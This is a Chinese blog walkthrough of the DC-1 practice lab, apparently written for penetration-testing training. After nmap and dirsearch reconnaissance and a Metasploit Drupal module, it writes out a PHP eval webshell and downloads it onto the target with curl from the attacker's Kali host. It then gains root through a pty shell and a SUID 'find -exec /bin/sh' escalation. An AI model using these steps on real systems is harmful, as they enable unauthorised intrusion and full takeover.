@@ -1,0 +1,180 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DC靶机流程 | 黄昏</title><meta name="author" content="tfktk"><meta name="copyright" content="tfktk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一.准备工作：1.准备好DC1靶机和kali linux虚拟机两台设备。2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来 DC1的mac地址：00:0C:29:0D:49:7C  3.kali linux虚拟机通过ifconfig找到当前的ip地址 etho：192.168.17.132  4.通过nmap端口扫描找到DC1的IP地址：n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC靶机流程">
+<meta property="og:url" content="http://example.com/2024/01/01/DC%E9%9D%B6%E6%9C%BA%E6%B5%81%E7%A8%8B/index.html">
+<meta property="og:site_name" content="黄昏">
+<meta property="og:description" content="一.准备工作：1.准备好DC1靶机和kali linux虚拟机两台设备。2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来 DC1的mac地址：00:0C:29:0D:49:7C  3.kali linux虚拟机通过ifconfig找到当前的ip地址 etho：192.168.17.132  4.通过nmap端口扫描找到DC1的IP地址：n">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2024-01-01T14:28:11.000Z">
+<meta property="article:modified_time" content="2024-01-01T14:43:17.570Z">
+<meta property="article:author" content="tfktk">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/01/01/DC%E9%9D%B6%E6%9C%BA%E6%B5%81%E7%A8%8B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":"ture","top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DC靶机流程',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-01 22:43:17'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_top_img.png')"><nav id="nav"><span id="blog-info"><a href="/" title="黄昏"><span class="site-name">黄昏</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC靶机流程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-01T14:28:11.000Z" title="发表于 2024-01-01 22:28:11">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-01T14:43:17.570Z" title="更新于 2024-01-01 22:43:17">2024-01-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC靶机流程"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一-准备工作："><a href="#一-准备工作：" class="headerlink" title="一.准备工作："></a>一.准备工作：</h1><p>1.准备好DC1靶机和kali linux虚拟机两台设备。<br>2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">DC1的mac地址：<span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">0</span>D:<span class="number">49</span>:<span class="number">7</span>C</span><br></pre></td></tr></table></figure>
+
+<p>3.kali linux虚拟机通过ifconfig找到当前的ip地址</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">etho：<span class="number">192.168</span>.<span class="number">17.132</span></span><br></pre></td></tr></table></figure>
+
+<p>4.通过nmap端口扫描找到DC1的IP地址：namp -sn 192.168.17.132&#x2F;24<br> “其中-sn”参数指定了 nmap 工具执行 “Ping Scan”，即使用 ICMP 回应来确定目标主机是否存活。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">命令：namp -sn <span class="number">192.168</span>.<span class="number">17.132</span>/<span class="number">24</span></span><br><span class="line">得出DC1的IP：<span class="number">192.168</span>.<span class="number">17.133</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704091615731-24f43c74-c974-45e3-802e-a510ce7e8cf2.png" alt="image.png"></p>
+<h1 id="二-获取信息："><a href="#二-获取信息：" class="headerlink" title="二.获取信息："></a>二.获取信息：</h1><p>1.通过此命令查看DC1的基本信息：nmap  -sS 192.168.17.133 -A<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704092567178-54de0a76-63b1-44cb-881b-570720c25d74.png" alt="image.png"><br>2.通过此命令查看DC1的全端口信息：nmap  -p- 192.168.17.133<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704092890218-39a06a68-9eb7-4744-bedb-80a6a5a7afbb.png" alt="image.png"><br>3.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704094358883-fbdc679d-d33d-41d9-ae85-dd9ae4e5701d.png" alt="image.png"><br>再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704094392970-8a2f5cd7-0d79-46f5-9240-fd5b523c67ba.png" alt="image.png"><br>4.进行目录扫描：<br>dirsearch -u 192.168.17.133 -x 403，404 -t 50<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704096389841-ac8a1e9b-072f-46cc-992a-ddafb4cd2c22.png" alt="image.png"><br>在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。<br>robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。<br>当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704096070188-0a24b7ba-1294-4cdf-b5c1-9d865689d136.png" alt="image.png"><br>再去看一下&#x2F;UPGRADE.txt可以发现Drupal是一个框架，当前版本是7.0，百度搜索一下，发现版本比较老，可能存在漏洞。</p>
+<h1 id="三-msf尝试进行攻击："><a href="#三-msf尝试进行攻击：" class="headerlink" title="三.msf尝试进行攻击："></a>三.msf尝试进行攻击：</h1><p>启动msf:msfconsole<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097120601-d2cc9855-7416-4f9e-8f1e-efaeaf41708f.png" alt="image.png"><br>搜索框架漏洞：search drupal<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097235060-b53250b7-22e8-41ab-92f8-888304e867d6.png" alt="image.png"><br>发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。<br>尝试用use 0会话没有创建成功，用use 2成功创建会话。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097625687-a4dd0a8f-65f5-45b7-a4bf-608ef5e3cbd8.png" alt="image.png"><br>show options查看必须要设置的选项<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097681635-0fe434fc-e915-475e-85a7-402942ec824b.png" alt="image.png"><br>set rhosts <strong>192.168.17.133#这个ip是DC1的ip</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097841942-f3bafd92-e046-4117-b3c1-53a674e19447.png" alt="image.png"><br>run一下出现这个说明伪终端创建成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098022861-603ca049-568b-4d66-98ab-6687d5252cad.png" alt="image.png"></p>
+<h1 id="四-尝试提权："><a href="#四-尝试提权：" class="headerlink" title="四.尝试提权："></a>四.尝试提权：</h1><p>shell一下，ls查看一下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098161189-d1c2a46f-ee02-4254-b0ab-5ee51f642b65.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098208918-dddb4c1f-0bae-43f5-9395-73222fb9262c.png" alt="image.png"><br>pwd当前位置，whoami我是谁<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098359199-0c718927-46e0-4977-a2b2-52ea54c02da9.png" alt="image.png"><br>cat flag1.txt<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099049092-539eb57c-1e57-4dc8-83f7-f5285a88cfda.png" alt="image.png"></p>
+<h2 id="CMS是什么？"><a href="#CMS是什么？" class="headerlink" title="CMS是什么？"></a>CMS是什么？</h2><p>CMS 是内容管理系统（Content Management System）的缩写。它是一种用于创建、编辑、管理和发布内容的软件系统或工具。<br>一个 CMS 提供了一系列的功能和工具，使用户可以轻松地创建、组织和发布内容，无需编写代码或进行复杂的技术操作。它通常包括用户管理、内容编辑、模板设计、发布管理等功能。<br>使用 CMS，用户可以创建和管理各种类型的网站，例如博客、新闻门户、企业网站、电子商务网站等。CMS 提供了易于使用的界面和工具，允许用户通过简单的操作来添加、编辑或删除页面内容、图像、视频、文章等，而无需涉及复杂的编程和设计知识。<br>一些常见的 CMS 包括 WordPress、Drupal、Joomla 等，它们都是广泛用于构建和管理网站的流行软件系统。通过使用 CMS，用户能够方便地管理网站的内容，使网站的维护和更新更加高效和简单。</p>
+<h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p>where curl #curl类似于一个命令行工具或者库<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099285441-aefcacab-3400-4c6d-a02f-f91321f66138.png" alt="image.png"><br>输入curl出现帮助手册说明存在。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099382857-a087ef21-36cc-451a-bd90-c19d11e38908.png" alt="image.png"><br>curl <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099478702-f1bc2532-f915-498b-befc-0852c39a96b2.png" alt="image.png"><br>在桌面新建一个1.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[cmd]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099768665-38421335-8090-4172-a06f-99ad968ad8c0.png" alt="image.png"><br>重新开一个cmd窗口输入python -m http.server 80#意思是说将当前目录设置为网站根目录。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100698868-cb6e5f0f-9c78-49a2-8afd-13bb4adabce0.png" alt="image.png"><br><a target="_blank" rel="noopener" href="http://192.168.17.132/">http://192.168.17.132</a>  -o 1.php<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100876363-b625babc-13a8-4ad1-ac86-19c5ebf2d5ca.png" alt="image.png"><br>ls发现上传成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100921325-dbbf9a27-02c4-4540-8588-7a274308e7a7.png" alt="image.png"><br>cat 1.php<br>出现其他的内容说明上传的方式错了，上传了个下载连接地址。<br>正确的方式是这样的：<br>curl <a target="_blank" rel="noopener" href="http://192.168.17.132/1.php">http://192.168.17.132/1.php</a> -o 2.php<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101099861-4ba79589-8d60-4084-8a0f-f93a33300d1d.png" alt="image.png"><br>cat 2.php<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101442272-d3c78ef4-de18-4d1c-80cb-57f900b9e568.png" alt="image.png"><br>成功之后调用系统命令执行函数。<br>192.168.17.133&#x2F;2.php?cmd&#x3D;sytem(ls);<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101508378-94efa053-014e-43bf-8545-f649153039e3.png" alt="image.png"><br>通过木马获取权限，这是一种办法。</p>
+<h1 id="五-短暂获取权限："><a href="#五-短暂获取权限：" class="headerlink" title="五.短暂获取权限："></a>五.短暂获取权限：</h1><p>python加强一下shell权限：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”#使用交互shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704102099589-99c9586a-cf89-4c12-a6e5-be70a7281f24.png" alt="image.png"><br>find提权：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null#这里利用SUID进行提权，查看SUID的二进制可执行文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p>解释：<br>find 是一个命令，用于在文件系统中搜索文件或目录。<br>&#x2F; 是搜索的起始点，表示从根目录开始搜索。<br>-user root 是一个选项，表示搜索属主为 root 的文件或目录。<br>-perm -4000 是另一个选项，表示搜索权限设置为 4000（八进制表示）的文件或目录。其中的 - 表示匹配减去指定权限后的结果，4000 则对应 SUID 权限位。<br>-print 是一个选项，表示找到匹配的文件或目录时打印出它们的路径。<br>最后的 2&gt;&#x2F;dev&#x2F;null 是将搜索过程中产生的错误信息（标准错误输出）重定向到 &#x2F;dev&#x2F;null 设备中，以避免显示错误信息。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704102314135-8d6ce1e0-5b70-46f2-b26d-c1fe9ef1fffd.png" alt="image.png"><br>find &#x2F; -name cron.php -exec “&#x2F;bin&#x2F;sh” ; #利用find获取root权限<br>id查看当前的用户。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704103236731-3f110ef3-b580-42e4-851d-330f2d65b1d1.png" alt="image.png"><br>cd &#x2F;root切换到root根目录<br>ls   发现最终的flag<br>cat theflnalfalg.txt 查看文件内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704103344531-6a88df95-4dbd-4155-9fe9-c635e20d6078.png" alt="image.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://tfktk.github.io/">tfktk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/01/DC%E9%9D%B6%E6%9C%BA%E6%B5%81%E7%A8%8B/">http://example.com/2024/01/01/DC靶机流程/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">黄昏</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/%E6%B8%97%E9%80%8F%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" title="渗透整体流程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透整体流程</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/24/postman%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E5%92%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" title="postman的sql注入以及报错和布尔盲注"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">postman的sql注入以及报错和布尔盲注</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tfktk</div><div class="author-info__description">冷酷且自信</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>hit me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">全新功能和改进已上线！立即更新！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一.准备工作：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二.获取信息：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-msf%E5%B0%9D%E8%AF%95%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三.msf尝试进行攻击：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B-%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">四.尝试提权：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">CMS是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">上传文件：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94-%E7%9F%AD%E6%9A%82%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">五.短暂获取权限：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/01/Burp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E6%95%B0%E6%8D%AE%E5%BA%93/" title="Burp的安装与使用,SQL注入之Oracle数据库">Burp的安装与使用,SQL注入之Oracle数据库</a><time datetime="2024-01-01T15:30:39.000Z" title="发表于 2024-01-01 23:30:39">2024-01-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/01/WAF%E7%BB%95%E8%BF%87%EF%BC%8C%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E4%BD%BF%E7%94%A8/" title="WAF绕过，安全狗的使用">WAF绕过，安全狗的使用</a><time datetime="2024-01-01T15:16:43.000Z" title="发表于 2024-01-01 23:16:43">2024-01-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/01/sql-labs%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" title="sql-labs相关知识点总结">sql-labs相关知识点总结</a><time datetime="2024-01-01T15:03:08.000Z" title="发表于 2024-01-01 23:03:08">2024-01-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/01/URL%E4%BC%AA%E8%A3%85/" title="URL伪装">URL伪装</a><time datetime="2024-01-01T14:53:42.000Z" title="发表于 2024-01-01 22:53:42">2024-01-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/01/%E8%BF%87%E6%BB%A4%E5%92%8C%E5%AE%BD%E5%AD%97%E8%8A%82-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E8%AE%B2%E8%A7%A3/" title="过滤和宽字节,堆叠注入讲解">过滤和宽字节,堆叠注入讲解</a><time datetime="2024-01-01T14:53:06.000Z" title="发表于 2024-01-01 22:53:06">2024-01-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By tfktk</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" 